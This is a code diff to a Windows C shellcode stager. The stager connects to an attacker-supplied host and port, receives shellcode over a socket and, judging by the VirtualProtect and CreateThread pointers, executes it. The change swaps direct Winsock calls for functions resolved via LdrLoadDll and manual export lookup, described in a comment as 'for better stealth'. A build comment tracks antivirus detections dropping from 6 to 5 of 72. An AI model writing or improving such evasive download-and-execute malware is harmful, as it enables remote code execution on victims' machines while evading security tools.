@@ -8,7 +8,7 @@
  *
  * x86_64-w64-mingw32-gcc -nostdlib -nostartfiles -s -Wl,--entry=main -Wl,--strip-all stager.c -o stager.exe
  * 
- * // Working flags below, 6/72
+ * // Working flags below, 5/72
  * x86_64-w64-mingw32-gcc -s -Wl,--entry=main -Wl,--strip-all stager.c -o stager.exe -lws2_32
  * */
 
@@ -21,10 +21,10 @@
 //#include "payload_util.h"
 #include "../utils/utils.h"
 #include "../utils/kernel32_util.h"
+#include "../utils/ntdll_util.h"
 
 //#include <stdio.h>
 //#include <stdlib.h>
-
 
 // TODO: GetProcAddress is not working... fix it
 
@@ -41,30 +41,41 @@ int run(const char* host, const char* port)
     FuncVirtualProtect pVirtualProtect = (FuncVirtualProtect)GetProcAddressManual("kernel32.dll", "VirtualProtect");
     FuncCreateThread pCreateThread = (FuncCreateThread)GetProcAddressManual("kernel32.dll", "CreateThread");
 	FuncWaitForSingleObject pWaitForSingleObject = (FuncWaitForSingleObject)GetProcAddressManual("kernel32.dll", "WaitForSingleObject");
+    FuncLdrLoadDll pLdrLoadDll = (FuncLdrLoadDll)GetProcAddressManual("ntdll.dll", "LdrLoadDll");
 
-	/*
-    FuncWSAStartup pWSAStartup = (FuncWSAStartup)GetProcAddressManual("ws2_32.dll", "WSAStartup");
-    FuncWSACleanup pWSACleanup = (FuncWSACleanup)GetProcAddressManual("ws2_32.dll", "WSACleanup");
-    FuncGetAddrInfo pGetAddrInfo = (FuncGetAddrInfo)GetProcAddressManual("ws2_32.dll", "getaddrinfo");
-    FuncFreeAddrInfo pFreeAddrInfo = (FuncFreeAddrInfo)GetProcAddressManual("ws2_32.dll", "freeaddrinfo");
-    FuncSocket pSocket = (FuncSocket)GetProcAddressManual("ws2_32.dll", "socket");
-    FuncCloseSocket pCloseSocket = (FuncCloseSocket)GetProcAddressManual("ws2_32.dll", "closesocket");
-    FuncConnect pConnect = (FuncConnect)GetProcAddressManual("ws2_32.dll", "connect");
+    // NOTE: use stack allocation instead of RtlInitUnicodeString for better stealth
+    UNICODE_STRING usDllName;
+    usDllName.Length = 22;
+    usDllName.MaximumLength = 24;
+    usDllName.Buffer = L"ws2_32.dll";
+    PVOID dllBase; // ws2_32.dll pModule
+    NTSTATUS status = pLdrLoadDll(NULL, 0, &usDllName, &dllBase);
+    // TODO: for now we just assume it's always successful
+    //if (NT_SUCCESS(status))
+
+    printf("start\n");
+    FuncWSAStartup pWSAStartup = (FuncWSAStartup)GetProcAddressManualM(dllBase, "WSAStartup");
+    printf("start2\n");
+    FuncWSACleanup pWSACleanup = (FuncWSACleanup)GetProcAddressManualM(dllBase, "WSACleanup");
+    FuncGetAddrInfo pGetAddrInfo = (FuncGetAddrInfo)GetProcAddressManualM(dllBase, "getaddrinfo");
+    FuncFreeAddrInfo pFreeAddrInfo = (FuncFreeAddrInfo)GetProcAddressManualM(dllBase, "freeaddrinfo");
+    FuncSocket pSocket = (FuncSocket)GetProcAddressManualM(dllBase, "socket");
+    FuncCloseSocket pCloseSocket = (FuncCloseSocket)GetProcAddressManualM(dllBase, "closesocket");
+    FuncConnect pConnect = (FuncConnect)GetProcAddressManualM(dllBase, "connect");
     //FuncSend pSend = (FuncSend)GetProcAddressManual("ws2_32.dll", "send");
-    FuncRecv pRecv = (FuncRecv)GetProcAddressManual("ws2_32.dll", "recv");
-	*/
+    FuncRecv pRecv = (FuncRecv)GetProcAddressManualM(dllBase, "recv");
 
     //std::cout << "1 - Starting" << std::endl;
 	// printf("1 - Starting\n");
     
     WSADATA wsaData;
-    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
+    if (pWSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
         //std::cout << "WSAStartup failed" << std::endl;
         // printf("WSAStartup failed\n");
         return 1;
     }
 
-    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    SOCKET sock = pSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (sock == INVALID_SOCKET) 
 	{
         //std::cout << "socket failed: " << WSAGetLastError() << std::endl;
@@ -86,7 +97,7 @@ int run(const char* host, const char* port)
     hints.ai_protocol = IPPROTO_TCP;
 
     //if (getaddrinfo(host.c_str(), port.c_str(), &hints, &result) != 0) 
-    if (getaddrinfo(host, port, &hints, &result) != 0) 
+    if (pGetAddrInfo(host, port, &hints, &result) != 0) 
 	{
         //std::cout << "getaddrinfo failed" << std::endl;
 		// printf("getaddrinfo failed\n");
@@ -113,14 +124,14 @@ int run(const char* host, const char* port)
     ADDRINFOA *ptr = result; // TODO: no need to assign result to ptr just use result?
     while (ptr != NULL)
     {
-        if (connect(sock, ptr->ai_addr, (int)ptr->ai_addrlen) == 0)
+        if (pConnect(sock, ptr->ai_addr, (int)ptr->ai_addrlen) == 0)
         {
             connected = 1;
             break;
         }
         ptr = ptr->ai_next;
     }
-    freeaddrinfo(result);
+    pFreeAddrInfo(result);
 
     if (!connected) 
 	{
@@ -139,7 +150,7 @@ int run(const char* host, const char* port)
 
 	unsigned char shellcode[512];
 	//int bytes_received = recv(sock, (char*)shellcode, sizeof(shellcode), 0);
-	int bytes_received = recv(sock, (char*)shellcode, 512, 0);
+	int bytes_received = pRecv(sock, (char*)shellcode, 512, 0);
     
     if (bytes_received <= 0) 
 	{
@@ -194,8 +205,8 @@ int run(const char* host, const char* port)
 
     //std::cout << "8 - Cleaning up" << std::endl;
     // printf("8 - Cleaning up"); 
-    closesocket(sock);
-    WSACleanup();
+    pCloseSocket(sock);
+    pWSACleanup();
     return 0;
 }
 
